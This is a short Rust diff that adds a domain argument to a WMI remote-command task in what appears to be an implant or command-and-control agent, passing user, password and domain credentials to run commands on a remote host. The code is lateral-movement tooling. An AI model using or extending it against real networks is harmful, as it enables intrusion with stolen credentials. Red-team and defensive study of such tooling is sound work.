@@ -694,12 +694,14 @@ pub unsafe fn execute_from_ptr(ptr: *const c_void, task_id: u8) -> Vec<u8> {
                 host,
                 user,
                 pass,
+                domain,
             } => {
                 use alloc::borrow::ToOwned;
                 let cmd_expanded = resolve_arg(command, &vars, &constants);
                 let host_expanded = resolve_arg(host, &vars, &constants);
                 let user_expanded = resolve_arg(user, &vars, &constants);
                 let pass_expanded = resolve_arg(pass, &vars, &constants);
+                let domain_expanded = resolve_arg(domain, &vars, &constants);
 
                 let cmd_str = String::from_utf8_lossy(&cmd_expanded);
                 let cmd_str = cmd_str.trim_end_matches('\0');
@@ -731,12 +733,22 @@ pub unsafe fn execute_from_ptr(ptr: *const c_void, task_id: u8) -> Vec<u8> {
                             .to_string(),
                     )
                 };
+                let domain_opt = if domain_expanded.is_empty() {
+                    None
+                } else {
+                    Some(
+                        String::from_utf8_lossy(&domain_expanded)
+                            .trim_end_matches('\0')
+                            .to_string(),
+                    )
+                };
 
                 match wmi_execute_command(
                     cmd_str,
                     host_opt.as_deref(),
                     user_opt.as_deref(),
                     pass_opt.as_deref(),
+                    domain_opt.as_deref(),
                 ) {
                     Ok(pid) => {
                         let pid_str = libs::utils::int_to_str(pid);
